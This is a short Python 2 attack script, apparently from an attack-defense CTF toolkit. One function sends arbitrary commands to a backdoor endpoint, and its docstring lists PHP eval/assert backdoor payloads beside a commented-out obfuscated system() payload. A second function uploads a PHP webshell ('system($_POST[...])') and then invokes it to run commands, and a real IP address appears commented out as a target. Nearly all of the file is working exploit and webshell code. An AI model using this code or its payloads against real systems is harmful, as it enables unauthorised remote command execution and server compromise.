#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	eval($_POST[333]);
	assert($_POST[333]);
	'''
	
	try:           
		#cmd = base64.b64encode(cmd)
		# This payload may not work under some php versions
		#payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
		#print payload
		data = 'haozigege=%s'% quote(cmd) 
		res = http("post",target,target_port,"/charpter2-1.0-SNAPSHOT/1.jsp",data,headers)
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res


def shit():
	from new_replay import *
	import requests
	import hashlib
	import time

	#target = '47.105.121.116'
	#target_port = 80
	my_hash = hashlib.md5('xxxx' + str(target) + str(target_port) + str(time.time())).hexdigest()
	file_dir = 'test_upload/'
	s = requests.session()

	shell = "<?php system($_POST['%s']);?>" %my_hash

	request_1 = open(file_dir + '1.txt').read()
	request_1 = request_1.replace('{{shell}}',shell)
	reply_1 = send_http(s,parse_http(request_1),target,target_port)
	print reply_1[1]

	request_2 = open(file_dir + '2.txt').read()
	request_2 = request_2.replace('{{hash}}',my_hash)
	request_2 = request_2.replace('{{cmd}}','')
	reply_2 = send_http(s,parse_http(request_2),target,target_port)
	print reply_2[1]




